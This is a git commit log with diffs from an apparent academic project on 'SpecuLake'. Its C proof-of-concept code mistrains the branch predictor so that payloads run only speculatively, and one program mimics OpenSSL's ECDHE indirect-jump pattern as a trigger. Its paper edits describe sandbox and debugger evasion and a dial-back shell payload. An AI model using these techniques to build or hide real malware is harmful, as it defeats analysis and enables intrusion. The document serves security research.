+#include "common.h"
+
+/*
+ * This is the target of the indirect call
+ * which we locate at the address of a gadget
+ * in the "victim" process we are trying to
+ * (mis)train the processor's BTB to call
+ */
+void target_fn(void) __attribute__((section(".targetfn")));
+void target_fn(void) {
+}
+
+
+#define TARGET_FN_ADDR 0x414100401000
+uint64_t jmp_ptr;
+void *map;
+
+void train()
+{
+    fn_ptr = target_fn;
+    //fn_ptr = map+600;
+    printf("fn_ptr: %p\n", fn_ptr);
+    //jmp_ptr = 0x400e60;
+    jmp_ptr = 0;
+    while (1) {
+        _mm_clflush(fn_ptr);
+        _mm_clflush(&jmp_ptr);
+        indirect(&jmp_ptr);
+        //((void (*)(void *))map)(&jmp_ptr);
+    }
+}
+
+int main(int argc, char *argv[])
+{
+    fn_ptr = target_fn;
+    printf("&fn_ptr = %p\n", &fn_ptr);
+    printf("indirect jump ptr = %p\n", fn_ptr);
+    printf("indirect fn = %p\n", indirect);
+    printf("target_fn = %p\n", target_fn);
+
+    printf("training...\n");
+
+    uint64_t base = TARGET_FN_ADDR;
+    if (argc > 1) {
+        base = strtoll(argv[1], NULL, 16);
+    }
+    printf("using base address %p\n", (void*)base);
+    map = mmap((void*)base, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
+    if (map == MAP_FAILED) {
+        perror("mmap");
+        return -1;
+    }
+    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));
+
+    // Set it to just immediately return (retq = 0xc3)...
+    memset(map+600, '\xc3', 1);
+
+
+    train();
+
+}

### 2018-05-06 paper/architecture.tex
add a subsec on nested speculation and hyperthreading

--- 2018-05-04 paper/architecture.tex
@@
 
+\FigCacheMiss
+
 \subsubsection{Reorder Buffer Capacity} \label{sssec:ROB}
@@
 
-\FigCacheMiss
+\subsubsection{Hyperthreading}
+
+When running our tests, we assign the payload and trigger program to the same
+core using \texttt{taskset}. We note in the absence of \texttt{taskset}, we can
+run multiple instances of trigger programs to occupy all cores, eventually
+having the payload program and trigger program become co-resident.
+
+We also explore using hyperthreading, where the CPU presents two virtual cores
+for each physical core, allowing the OS to schedule programs to each
+simultaneously. In effect, this can cause the interleaving of instructions
+between two programs to be much finer-grained: at the instruction level rather
+than changing only at the OS-controlled context switch. We find that this
+has two effects on speculative programs. First, the finer-grained interleaving
+allows for a higher hit rate from the cache, suggesting that each indirect jump
+pattern is more likely to result in speculatively executing from the intended
+position. % TODO: can we quantify this?
+Second, because the physical CPU is being shared, it effectively halves the
+number of instructions that can be run in the speculative context.
+Figure~\ref{fig:spec-capcity} shows the instructions that can be run when
+running trigger and payload on a single core vs.\ a pair of hyperthreaded cores.
+
+\subsubsection{Nested Speculation}
+
+We explore the ability for the CPU to ``double speculate'', where a stalled
+indirect jump while the CPU is speculating causes it to predict the target and
+speculate a second time. For instance, suppose a payload program truly jumps to
+target A, but the CPU is mistrained by a trigger program that jumps to B, thus
+causing the payload program to speculatively execute at B. At B, suppose there
+is a second indirect jump, perhaps using the same register as the first jump
+(which has still not resolved). If the trigger program jumps to C, the payload
+program will speculate a second time and also begin executing code at C.
+
+We find that not all Intel CPUs we tried support nested speculation. For
+example, it appears Haswell chips do not speculate while already speculating,
+but nonetheless support non-nested \speculake. Both Sandy Bridge (which
+preceeded Haswell) and Kaby Lake (which followed Haswell) support nested
+speculation.
+% Could cut
+We leverage this support in Section~\ref{subsec:decryption} to
+increase the security of speculative decryption keys.
 

### 2018-05-06 paper/architecture.tex
Related work and reference filling.

@@
 number of instructions that can be run in the speculative context.
-Figure~\ref{fig:spec-capcity} shows the instructions that can be run when
+Figure~\ref{fig:spec-capacity} shows the instructions that can be run when
 running trigger and payload on a single core vs.\ a pair of hyperthreaded cores.

### 2018-05-06 paper/implementation.tex
Related work and reference filling.

@@
 \subsection{AES Decryption}
+\label{subsec:impl-aes}
 The speculative world is able to take advantage of the AES-NI instructions to
@@
 the channel width and the required minimum signal strength determine the maximum
-throughput that can be acheived. As demonstrated in Figure~\ref{fig:spec_bangwidth} 
+throughput that can be acheived. As demonstrated in Figure~\ref{fig:spec_bandwidth} 
 between 6 and 8 bits channel width provides an idea of the maximum speed at which the 
@@
 \subsection{OpenSSL Trigger}
+\label{subsec:openssl}
 
@@
 
+\subsection{Nested Speculation}
+\label{subsec:nested-spec}
+
 %%%%%%%%%%%%%%

### 2018-05-06 paper/payloads.tex
Related work and reference filling.

@@
 To demonstrate that arbitrary computation can be done in the speculative world
-we implement a Turing machine, configured to run the 5-state Busy Beaver function~\cite{busy-beaver}.
+we implement a Turing machine, configured to run the 5-state Busy Beaver 
+function~\cite{chaitin1987computing,herken1992universal}.
 The Busy Beaver is a configuration that writes the most
@@
 AES decryption. We discuss details of our speculative AES decryption in
-Section~\ref{sec:impl-aes}.
+Section~\ref{subsec:impl-aes}.
 
@@
 We describe our implementation of this nested speculative execution concept in
-Section~\ref{sec:impl-aes}.
+Section~\ref{subsec:nested-spec}.
 
@@
 \subsection{Virtual Machines}
-Given the specific constraints that the speculative environment enforces on
-these payloads, general purpose computation []. We demonstrated in
-Section~\ref{subsec:turing} that general purpose computation is possible using
-computation performed in the speculative environment. However, a turing machine
-is not a user friendly model, nor is it an efficient model for computation when
+We demonstrated in Section~\ref{subsec:turing} that general purpose computation 
+is possible in the speculative environment in spite of the contraints 
+imposed by the speculative world. However, a turing machine
+is not an efficient or usable model for computation when
 attempting to accomplish tasks on modern processors.

### 2018-05-06 paper/related-work.tex
Related work and reference filling.

--- 2018-05-01 paper/related-work.tex
@@
 
-This work makes use of ideas spanning multiple computer science and computer
-security disciplines.
+Many resourcess have been useful in developing the \speculake exploit 
+model.
 
-\subsection{CPU Reverse Engineering}
-Leading up to the discovery and release of the Spectre and Meltdown vulnerabilities
-multiple teams were working to reverse engineer the mechanisms that implemented in 
-the microcode of various processors.
+\subsection{Weird Machines \& Red-Pills}
+Hardware side effects often leave behind unexpected state transitions 
+that are not, or cannot be, accounted for in modeling environments. Malware
+has historically made use of these bugs to create "weird" models of 
+computation~\cite{weird_machines}. These state transitions can also leak 
+information about the environment in which a program is running, which 
+malware has used to detect honey-pots and emulated environments.
 
-\subsection{Weird Machines}
+The term \textit{weird machine} comes from work done by Bratus \textit{et al.}
+composing bugs and features of a system to create arbitrary compuatation with 
+interesting properties~\cite{weird_machines,bratus2011exploit}. This 
+encompasses many traditional computer vulnerabilities including 
+buffer overflow~\cite{buffer_overflow}, format string exploits~\cite{format_string_exploit}, 
+and return oriented programming~\cite{shacham2007geometry} to name only a few.
 
-\subsection{Red Pills}
+Bangert~\textit{et al.} demonstrate that a turing complete weird machine 
+can be constructed using the page fault handling mechanism in Intel's
+IA32 architecture~\cite{bangert2013page}. Bugs like this are abundant in
+modern processors as multiple threads share system resources cooperatively
+and optimizations is done objectively with regards of the 
+process isolation for the most part. Accessing copoerative hardware resources is at
+the heart of the \speculake model, which constructs a hardware weird machine
+using speculative branching and \texttt{Flush+Reload}. This is 
+very much in the spirit of traditional exploit creation~\cite{weird_exploits}.
+
+\smallskip
+
+Similarly hardware bugs have been used to identify and fingerprint execution
+environments -- in malware this is know as a red-pill~\cite{red-pill} and 
+is typically used to ensure that malware is not being emulated or 
+debugged~\cite{lindorfer2011detecting, balzarotti2010efficient}. Paleari 
+\textit{et al.} automate the process of discovering red-pills by applying 
+fuzzing techniques to emulated environments and identifying situations 
+in which the emulators differ from their physical counterparts~\cite{paleari2009fistful}.
+This is still by no means an exhaustive list of red-pills for a given 
+processor as many rely on timing or race conditions in physical 
+environments.
+
+% Hardware bare-metal analysis
+To combat this Kirat \textit{et al.} propose automated "bare-metal" 
+emulation of malware~\cite{kirat2011barebox}, and methods to determine if malware
+is performing red-pill checks to avoid emulation environments~\cite{kirat2014barecloud}.
+Symbolic execution can also be used to combad red-pills by finding environmental triggers 
+in malicious binaries~\cite{schwartz2010all}.
+
+\smallskip
+
+Unlike other red-pills based on hardware bugs, \speculake cannot be bypassed
+by patching binaries as the speculation can only happen on "bare-metal" systems, 
+and speculative execution will not trigger debugging break-points as 
+they are never completed in a committed state.
+Symbolic execution will also fail to find a target function as it is never on the 
+execution pathway.
 
@@
 
+The \speculake model relies critically on cache side channel attacks to 
+communicate information from the speculative world. Cache side-channels have 
+been used against a number of processors at essentially all different 
+caching levels -- L1 data cache~\cite{percival2005cache,zhang2012cross,osvik2006cache}, 
+L1 instruction cache~\cite{aciiccmez2010new}, 
+L2 cache~\cite{ristenpart2009hey,percival2005cache}, 
+LLC~\cite{ristenpart2009hey,liu2015last}, 
+and branch prediction cache~\cite{aciiccmez2007power}. 
+These attacks have also been performed in 
+cloud~\cite{ristenpart2009hey,zhang2012cross}, 
+browser~\cite{oren2015spy,google_cache_browser},
+security critical encryption~\cite{yarom2014recovering,tromer2010efficient}
+environments, demonstrating how ubiquitous hardware side-channel exploits can be.
+
+Most cache side-channles fall into one of the following categories, although
+some implement variations on these models.
+
+\begin{itemize}
+\item \texttt{Evict+Time} - An attacker with a synchronized clock evicts a series of items 
+from cache. The victim then proceeds with computation, at which point the attacker can 
+time accesses to each evicted item to identify which items a victim loaded~\cite{neve2006refined}. 
+\item \texttt{Prime+Probe} - An attaker performs a computation, then evicts specific 
+items from the cache before performing the same action again. Information about the cache
+access patterns can be gained by comparing the timimg of the two 
+computations~\cite{tromer2010efficient}.
+\item \texttt{Flush+Reload} - Two cooperating processes  make use of the \texttt{Evict+Time} 
+model to form a communication channel~\cite{yarom2014flush+}.
+\item \texttt{Flush+Flush} - Follows the same model as \texttt{Prime+Probe},
+however clflush is used instead of a load as it resolves much quicker in cases 
+where the item is not in cache~\cite{gruss2016flush+flush}.
+\end{itemize}
+
+While other works have demonstrated higher throughput from similar 
+covert cache side channels~\cite{liu2015last}, \speculake incurrs slightly higher performance 
+penalties in our implementation as we perform redundancy checks to 
+ensure the signal strength.  This redundancy combined with the intentional cache misseses
+which enable speculative execution cost hundreds to thousands of clock cycles
+per round.
+
+\subsection{Speculative Execution}
+
+% Lead in 
+Leading up to the discovery and release of the Spectre and Meltdown vulnerabilities
+multiple teams were working to reverse engineer the mechanisms that implemented in 
+the microcode of various processors and document their behavior~\cite{intel-instruction-tables, uop_article}.
+Efforts to examine cache and memory security also preempted the spectre work, 
+including Sophia D'Antoine's thesis work developing a side channel based on 
+instruction interleavings in the CPU~\cite{d2015exploiting}. Similar research into branch 
+predictors, cache replacement policies, and reorder buffer construction including work by Matt 
+Godbolt~\cite{godbolt2016branch}, Henry Wong~\cite{measuring-rob} paved the runway for 
+dedicated branch prodiction side-channels.
+
+% Discovery & Followup
+Given the numerous directions that were being investigated in reverse engineering 
+Intel processors, multiple teams discovered the Spectre vulnerabilites concurrently including the 
+various teams associated with Kocher \textit{et al.}~\cite{spectre}, the Project Zero team 
+at Google~\cite{project_zero},and various others~\cite{evtyushkin2018branchscope,maisuradze2018speculose}. 
+These works propose multiple variants making use of banch prediction.  Follow 
+up work on speculative execution side channels have also demonstrated
+web-based vulnerabilites~\cite{genkin2018drive} as well as hardware isolation  
+leaks in Intel's SGX~\cite{spectre_sgx}.
+
+% defenses 
+Much like cache side channel vulnerabilities speculative execution is relatively
+critical to processor performance and requires significant software, and hardware 
+updates to fully address. Multiple measures have been proposed to address the 
+individial variants of Spectre.  Trippel \textit{et al.} proposes a method of faithfully simulating 
+hardware bugs, such as processes cooperatively using speculating branch prediction,
+by synthesizing microarchetecture defects~\cite{trippel2018meltdownprime}. However, 
+manufacturers generally guard complete formal descriptions of processor microarchitecture closely, 
+making this a less accessible solution for the research community.
+
+The main defenses that have been widely applied to 
+speculative branching attacks uses compiler level software patches to wrap sensitive 
+function calls. Retpoline is Google's in house fix for enforcing 
+isolation against branch target injection attacks~\cite{retpoline}. By crafting 
+the stack around a sensitive function to trap into a pause instruction if the processor 
+attempts to speculate past the wrapper data side-effects can be protected against. 
+Similarly, Gruss \textit{et al.} propose the KAISER software patch to enforce address space
+isolation for kernel and user space proceses~\cite{gruss2017kaslr}. 
+Other proposals have considered hypervisor enforced time domain separation at varying 
+granularity~\cite{renau2018securing}, and fuzzy clocks that would reduce the accuracy 
+of any time based exfiltration pathway~\cite{hu1992reducing}. However, none of these defenses 
+fundamentally defeat the use of a branch predictor as a cooperative mechanism
+spanning multiple processes.
+
+\smallskip
+
+We can certainly look forward to more vulnerabilities relating to speculative 
+branching and related hardware side channels. Our work represents an exploit 
+model for these vulnerabilities reliant upon shared hardware resources.
+
 %%%%%%%%%%%%%%

### 2018-05-06 iftest/if.c
add example of variable declaration changing behavior

@@ -49,6 +49,8 @@ unsigned int junk=0;    // For rdtscp
 // #define STATE4
 
 uint8_t rand_xor;
+uint8_t randt;
+uint8_t *rand2 = &randt;
 void init_rand() {
     srand(time(0));
     rand_xor = (uint8_t) rand() & 0xff;

### 2018-05-06 iftest/if_target.c

@@ -11,9 +11,6 @@ extern uint8_t lookup[2][4];
 extern uint8_t lookup[2][5];
 #endif
 
-extern uint8_t *turing_tape;
-extern uint8_t turing_state;
-
 // This will be an int 0-255 typically...
 void signal(uint64_t state)
 {

### 2018-05-07 turing/turing.c
working turing. tldr, don't flush turing state/tape from cache

@@ -110,6 +110,9 @@ void check_probes() {
 uint64_t jmp_ptr;
 
 
+uint64_t space[100];
+
+
 #define TURING_TAPE_LEN 1024*512
 uint8_t *turing_tape;
 uint8_t turing_state;
@@ -132,306 +135,38 @@ void updateState(uint8_t write, uint8_t move_right, uint8_t state){
     true_max_i = (state<<2)| (0 << 1) | (*turing_tape & 0x1);
 }
 
-void true_turing(void){
-
-    // 3-state, 2-symbol turing machine that wins Busy Beaver
-    //    A   B   C
-    //0   1RB 0RC 1LC
-    //1   1RH 1RB 1LA
-    // 4-state 2-symbol
-        //  A   B   C   D
-    //  0   1RB 1LA 1RH 1RD
-    //  1   1LB 0LC 1LD 0RA
-    //
-    //  5-state 2-symbol
-    //          A   B   C   D   E
-    //      0   1RB 1RC 1RD 1LA 1RH
-    //      1   1LC 1RB 0LE 1LD 0LA
-    //
-    uint8_t symbol = *turing_tape;
-    true_max_i = lookup[symbol][true_turing_state];
-    #ifdef STATE4
-    switch(true_max_i) {
-        case 0:
-            true_write = 1;
-            true_move_right = 1;
-            true_turing_state = 1;
-            break;
-        case 1:
-            true_write = 1;
-            true_move_right = 0;
-            true_turing_state = 0;
-            break;
-        case 2:
-            true_write = 1;
-            true_move_right = 1;
-            true_turing_state = 4;
-            break;
-        case 3:
-            true_write = 1;
-            true_move_right = 1;
-            true_turing_state = 3;
-            break;
-        case 4:
-            true_write = 1;
-            true_move_right = 0;
-            true_turing_state = 1;
-            break;
-        case 5:
-            true_write = 0;
-            true_move_right = 0;
-            true_turing_state = 2;
-            break;
-        case 6:
-            true_write = 1;
-            true_move_right = 0;
-            true_turing_state = 3;
-            break;
-        case 7:
-            true_write = 0;
-            true_move_right = 1;
-            true_turing_state = 0;
-            break;
-    }
-    #else
-    if (turing_state == 0) {    // A
-        if (symbol == 0) updateState(1, R, 1);
-        else             updateState(1, L, 2);
-    } else if (turing_state == 1) { // B
[…]

### 2018-05-07 turing/turing_target.c

@@ -14,6 +14,10 @@ extern uint8_t lookup[2][5];
 extern uint8_t *turing_tape;
 extern uint8_t turing_state;
 
+void target_fn(void) __attribute__((section(".targetfn")));
+void signal(uint64_t state) __attribute__((section(".targetfn")));
+void update_state(uint8_t write, uint8_t move_right, uint8_t state) __attribute__((section(".targetfn")));
+
 // This will be an int 0-255 typically...
 void signal(uint64_t state)
 {
@@ -33,7 +37,6 @@ void update_state(uint8_t write, uint8_t move_right, uint8_t state)
 #define L 0
 #define R 1
 
-void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
 
@@ -51,24 +54,24 @@ void target_fn(void)
     //      0   1RB 1RC 1RD 1LA 1RH
     //      1   1LC 1RB 0LE 1LD 0LA
     //
+    //signal(8);
     uint8_t symbol = *turing_tape;
-    // if (turing_state == 0) {    // A
-    //     if (symbol == 0) update_state(1, R, 1);
-    //     else             update_state(1, L, 2);
-    // } else if (turing_state == 1) { // B
-    //     if (symbol == 0) update_state(1, R, 2);
-    //     else             update_state(1, R, 1);
-    // } else if (turing_state == 2) { // C
-    //     if (symbol == 0) update_state(1, R, 3);
-    //     else             update_state(0, L, 4);
-    // } else if (turing_state == 3) { // D
-    //     if (symbol == 0) update_state(1, L, 0);
-    //     else             update_state(1, L, 3);
-    // } else if (turing_state == 4) { // E
-    //     if (symbol == 0) update_state(1, R, 5);
-    //     else             update_state(0, L, 0);
-    // }
-    update_state(symbol, 0x0, turing_state);
+    if (turing_state == 0) {    // A
+        if (symbol == 0) update_state(1, R, 1);
+        else             update_state(1, L, 2);
+    } else if (turing_state == 1) { // B
+        if (symbol == 0) update_state(1, R, 2);
+        else             update_state(1, R, 1);
+    } else if (turing_state == 2) { // C
+        if (symbol == 0) update_state(1, R, 3);
+        else             update_state(0, L, 4);
+    } else if (turing_state == 3) { // D
+        if (symbol == 0) update_state(1, L, 0);
+        else             update_state(1, L, 3);
[…]

### 2018-05-07 openssl/ecdhe-triggered.c
ECDHE triggered works on my desktop (cherry picked from 862c5be76fa17da7fc03b543a498c11d8a0cfa74)

@@ -1,0 +1,401 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <signal.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "common.h"
+
+// Defines the bandwidth we can communicate
+// from speculative -> von neuman
+// e.g. 256 would be 1 byte of info
+// Tradeoff here is larger bandwidth means we have
+// to check more places in probe_buf (and flush them)
+#define NUM_PROBES 256
+#define DECRYPT_LEN 256
+
+// These define the stride length we take between probes
+// This thwarts a clever CPU's stride prediction
+// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
+// Generally, this results in not seeing ANY winning probes
+// in which case, we change cur_probe_space and retry
+#define MAX_PROBE_SPACE (1000003)
+double avgpct = 0;
+
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+
+
+// The (heap-allocated) probe buffer
+// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+// in the cache to communicate the value i from speculative -> von neuman
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+
+
+// This is a simple counter, accessed by the speculative function (target_fn)
+// so it can compute on it.
+uint16_t signal_idx = 0;
+uint64_t instr = 0;
+
+
+// Stats
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
+uint64_t tot_time = 0;      // Number cycles total
+
+unsigned int junk=0;    // For rdtscp
+
+
+void *map;
+#define TARGET_FN_ADDR 0x414100401000
+
+
+
+typedef struct jump_st {
+    uint64_t from;
+    uint64_t to;
+} jump;
+
+#define PAGE_SIZE 0x1000
+#define MAX_PAGES 100
+#define NUM_JUMPS 31
+
+
+inline void call(void *fn_ptr) __attribute__((always_inline));
[…]

### 2018-05-07 paper/implementation.tex
add OpenSSL section

@@
 
+Benign programs can act as a trigger program, provided they perform sufficient
+indirect jumps to train the branch predictor. We experiment using the OpenSSL
+library as a potential benign trigger, as its source code has gratuitous use of
+function pointers which compile to indirect jumps. In addition, it has many
+complicated code paths that can be easily selected by remote clients by their
+choice of cipher suite.
+
+For these experiments, we disable ASLR for simplification, but note that the
+branch predictors can be used to determine ASLR offsets and our attack adjusted
+accordingly~\cite{evtyushkin2016jump}.
+
+We used \texttt{gdb} to run an instance of an OpenSSL server (version 1.0.1f),
+and printed out every instruction executed and its address after a breakpoint on
+the \texttt{SSL\_new} function. We then made a TLS connection to the
+server\footnote{Which took well over 2~hours, potentially making it the slowest
+TLS handshake to have ever completed},
+which produced over 13~million instructions, including over 359,000 direct jumps
+and 28,000 indirect jumps. We then searched for the longest repeated set of over
+30 indirect jumps that end with a unique jump (i.e. source and destination do
+not occur in the previous 30 indirect jumps).
+
+We discovered a candidate that corresponds to code in OpenSSL's
+\texttt{nistp256.c} that contained 31 indirect jumps repeated 254 times in our
+handshake. This code is used during the TLS key exchange as the server computes
+the ECDHE shared secret. We made a list of 31 source-destination address pairs
+for these indirect jumps, and constructed a jump/ret chain at those addresses in
+our payload program. Our program would jump to the source address of a pair,
+which had a single \texttt{retq} instruction, which would pop the next
+destination off the stack and perform the indirect jump. At each destination
+address, we placed a static (direct) \texttt{jmpq} to bring execution to the
+next source address in our list. The final jump source/destination pair was not
+performed (and the destination was not pushed to the stack). However, we placed
+code at the destination address that loaded a value into the cache (our target
+function). The last pair's source performs an indirect jump that returns to our
+payload program, which immediately times probing the cache to see if any value was
+loaded.
+
+We ran these experiments on an Intel Haswell
+i5-4590 CPU, with OpenSSL and our payload program taskset to the same core.
+We induced the jump pattern in OpenSSL by running Apache benchmark against it to
+generate thousands of connections, using the ECDHE key exchange with the
+secp256r1 curve (ECDHE-RSA-AES256-GCM-SHA384). When running Apache benchmark locally, our payload program
+reliably achieves a 3.5\% hit rate. When apache benchmark runs on a remote
+machine, the hit rate drops to approximately 2.0\%. Nonetheless, this is
+sufficient to perform computation, as we simply perform thousands of iterations
+to extract results from the speculative world before updating any real world state.
+
+We verified that our payload program did not observe any cache loads when we ran
+other programs that consumed CPU on the same core. In addition, when we used
+Apache benchmark to create thousands of connections with a different cipher
+suite (DHE-RSA-AES128-GCM-SHA256), we similarly received no hit rate. This
+could potentially allow an adversary to use an obscure or uncommon (but still
+supported) cipher suite to trigger a malicious payload program on a remote server.
+
 % extract jump patterns

### 2018-05-07 paper/figures.tex
Future work multiple trigger stages and Model figure updates
Re-ran Bandwidth test and re-generated graph

@@
     \centering
-        \includegraphics[width=0.4\textwidth]{figures/general_model}
+        \includegraphics[width=0.4\textwidth]{figures/general_model.pdf}
     \caption{ General model of speculative computation within the Measure 
@@
         \textit{Resultant Computations} based on the value returned from 
-        Prime and Probe to update the state of the process. }
+        \texttt{Flush+Reload} to update the state of the process. }
     \label{fig:general_model}
@@
     \caption{Speculative Bandwidth - Using the speculative primitive 
-        1KB of data can be decrypted and exfiltrated at a speed around 5500 kbps
+        1KB of data can be decrypted and exfiltrated at a speed between 5 and 6 kbps
         from the speculative world. Varying the width of the channel 
@@
     \centering
-        \includegraphics[width=0.5\textwidth]{figures/spasm_model}
+        \includegraphics[width=0.5\textwidth]{figures/spasm_model.pdf}
     \caption{This model describes the VM control flow. An encrypted SPASM binary 

### 2018-05-07 paper/implementation.tex
Re-ran Bandwidth test and re-generated graph
add turing implementatino

@@
 \subsection{Turing Machine}
+\label{subsec:impl-turing}
+
+We implemented a 5-state Busy Beaver Turing machine.
+This implementation led to the discovery of many of the limitations and
+capabilities of speculative execution.
+
+We found that our implementation is able to examine the state and current symbol
+on the Turing tape and make decisions based on these values as long as they are
+in cache. The subtlety here is that in order to enter this speculative execution
+the function pointer must be flushed from cache (causing the branch predictor to
+incorrectly predict the target function as the destination). As such, care must
+be taken to ensure that the function pointer and state to be used in the
+speculative execution must be in separate cache lines.
+
+In our model the real world keeps track of the Turing state and tape. The
+speculative world uses this information to load a specific value into cache. The
+real world then times the loading of these values to determine which value was
+loaded speculatively. This value is then used to update the state and tape and
+the process is repeated until a halt state is reached.
+
+In order to have confidence the value loaded speculatively is correct we repeat
+the execution a number of times and look for the value that has the quickest
+real-world load time over each repetition, whichever value is quickest to load
+the most is then determined to be the ``correct'' value.
+
+Our Turing implementation discovered that only 50 repetitions is sufficient for
+the real world to determine the correct value with over 80\% confidence.
+
+We implemented the 5 state Busy Beaver configuration which requires over 47
+million steps to complete. We were able to verify that the speculative world
+could correctly compute 20 thousand steps with no errors.
 
@@
 only accessed when the correct trigger program is running the challenges facing
-a reverse engineer are great. We discuss further methods for obfuscating specualtive
-decryption in section~\ref{subsec:future-work}.
+a reverse engineer are great. We discuss further methods for obfuscating
+specualtive decryption in section~\ref{subsec:future-work}.
 
@@
 and we demonstrate that the speed at which information can be decrypted using the speculative 
-primitive is dependent on the configuration of the \speculake model. Specifical,
+primitive is dependent on the configuration of the \speculake model. Specifically,
 the channel width and the required minimum signal strength determine the maximum
-throughput that can be acheived. As demonstrated in Figure~\ref{fig:spec_bandwidth} 
+throughput that can be achieved. As demonstrated in Figure~\ref{fig:spec_bandwidth} 
 between 6 and 8 bits channel width provides an idea of the maximum speed at which the 
@@
 \FigSpecBandwidth
-% implementation 
-%   Key Schedule expansion / obfuscation
-%
-% you can speculatively execute AES instructions
 
@@
 
-% extract jump patterns
-% sufficiency checks 
-%
-% trigger strength
-%   - future work developing tools to determine sufficiency and strength
-%
-% OPENSSL TRIGGERING REVERSE SHELL SPASM PAYLOAD
-
 \subsection{Nested Speculation}

### 2018-05-07 paper/appendix_spasm.tex
partial related work, and bib fixes across paper
Read through - minor updates

@@
+\pagebreak
 \section{SPASM Instruction Set}
@@
 
-The progamming model used by SPASM build up values on the maintained stack
-and stores values in specially reserved offsets equivalent to registers 
-in order to build up system calls. Immediates can be assigned into VAL
+The progamming model used by SPASM builds up values on the maintained stack
+and stores values in specially reserved offsets equivalent to x86 registers 
+in order to perform system calls. Immediates can be assigned into VAL
 incrementally, and stored, operated on, or pushed onto the maintained
-stack. Control Flow is implemented by modifying the maintained 
-instruction pointer SRIP, including conditional jmps.
+stack. Control Flow, including conditional jmps, is implemented by modifying 
+the maintained instruction pointer SRIP.
 
@@
 \textit{HelloWorld}, \textit{FizzBuzz}, and \textit{DialbackShell}.
-See Figure~\ref{fig:spasm_model} for a diagram of our usage of SPASM 
-within the \speculake model.
+See Figure~\ref{fig:spasm_model} for a diagram of the SPASM emulator's
+usage within the \speculake model.
 
@@
 \item[DADD] (0x0D) - 
-Dereference the value in PTR, add VAL and store back into the dereference 
+Dereference the value in PTR, add VAL and store the result back into the dereference 
 of PTR.
@@
 \item[DMUL] (0x0C) - 
-Dereference the value in PTR, multiply VAL and store back into the dereference
+Dereference the value in PTR, multiply VAL and store the result back into the dereference
  of PTR.
@@
 \item[DDIV] (0x0B) - 
-Dereference the value in PTR, divide by VAL and store back into the 
+Dereference the value in PTR, divide by VAL and store the result back into the 
 dereference of PTR.
@@
 \item[DSHL] (0x09) - 
-Dereference the value in PTR, shift left by VAL and store back into the 
+Dereference the value in PTR, shift left by VAL and store the result back into the 
 dereference of PTR.
@@
 \item[DSHR] (0x08) - 
-Dereference the value in PTR, shift right by VAL and store back into the 
+Dereference the value in PTR, shift right by VAL and store the result back into the 
 dereference of PTR.
@@
 \item[DAND] (0x07) - 
-Dereference the value in PTR, bitwise and VAL and store back into the 
+Dereference the value in PTR, bitwise and with VAL and store the result back into the 
 dereference of PTR.
@@
 \item[DOR] (0x06) - 
-Dereference the value in PTR, bitwise or with VAL and store back into the 
+Dereference the value in PTR, bitwise or with VAL and store the result back into the 
 dereference of PTR.
@@
 \item[DXOR] (0x05) - 
-Dereference the value in PTR, bitwise xor with VAL and store back into the 
+Dereference the value in PTR, bitwise xor with VAL and store the result back into the 
 dereference of PTR.

### 2018-05-07 paper/architecture.tex
Read through - minor updates

@@
 
+\FigCacheMiss
+
 \FigSpecMeasure
@@
 % For simplicity, we report results from only the Xeon-1270.
-
-%Speculative branching is not a new feature in processors~\cite{branching-hist}, 
-%and it has been integrated in multiple generations of commodity processors today. 
-%Accordingly speculative instruction capacity has fairly well defined limits, in 
-%line with known features of processor designs. We have determined that features 
-%like reorder buffers (ROB), physical register file (PRF), and cache miss timing
-%determines a strong limit on the number of instructions that can be accomplished
-%speculatively.
 
@@
 considerably longer to load, in theory allowing for thousands of speculative
-instructions.
-
-\FigCacheMiss
+instructions in a significant fraction of runs.
 
@@
 and instruction complexity both have an impact on the number of instructions
-that can be executed. Instruction complexity is determined the number of
+that can be executed. Instruction complexity is determined by the number of
 $\mu$ ops that the instruction uses, which appears to be what is tracked in the ROB.
@@
 idomatic no-ops and zero idioms, which have no reliance on register values, 
-for example the instruction \textit{xchg \%rax \%rax} and \textit{xor \%rax, \%rax}. 
+for example the instruction \texttt{xchg \%rax \%rax} and \texttt{xor \%rax, \%rax}. 
 However, if an instruction is a potential data hazard, it must use an entry in the PRF
@@
 
-We find that not all Intel CPUs we tried support nested speculation. For
+We find that not all Intel CPUs support nested speculation. For
 example, it appears Haswell chips do not speculate while already speculating,

### 2018-05-07 paper/discussion.tex
Read through - minor updates

@@
 To create further difficulties for a reverse engineer, or to further target
-the execution environment in which a sample executes it is possible
+the execution environment it is possible
 to have the payload program test a series of separate jump patterns. The decryption
@@
 
-While this would increase the difficulty for a reverse engineer who has access
+While this would increase the difficulty for analyst  who has access
 to a sample in isolation, it  does not add any extra layers of complication 
-for reverse engineers who can observe the entire decryption process. Any state 
+for an analyst who can observe the entire decryption process. Any state 
 encoded in the real world during the individual stages will be available to current 
-debugging tools. This allows reverse engineers start the sample from the initial
-state of any stage in subsequent runs. For example, they could patch the 
+debugging tools. This allows the initial state of a sample to be modified
+to simplify subsequent runs. For example, they could patch the 
 binary to begin with the state of the final stage such that only the final 

### 2018-05-07 paper/introduction.tex
add high-level figure
Related work and reference filling.
Read through - minor updates

@@
 \emph{triggers} that only run the payload when certain conditions are present, preventing
-it from executing when it is inside an analysis sandbox or debugger.
+it from executing when it is inside an analysis sandbox or 
+debugger~\cite{balzarotti2010efficient,red-pill}.
 
@@
 
+%Figure~\ref{fig:high-level}
+
+\FigHighLevel
+
 While it's possible for the trigger and payload programs to be bundled in a
@@
 investigate using the OpenSSL library as a benign trigger
-program in Section~\ref{sec:tk}. If the trigger program is another benign
+program in Section~\ref{subsec:openssl}. If the trigger program is another benign
 program on the system, the analyst has the difficult task of identifying which
@@
 We show that this simple payload is able to perform several system calls
-in a reasonable time, ultimately launching a dial-back TCP shell in under 8~seconds after
+in a reasonable time, ultimately launching a dial-back TCP shell in under 7~seconds after
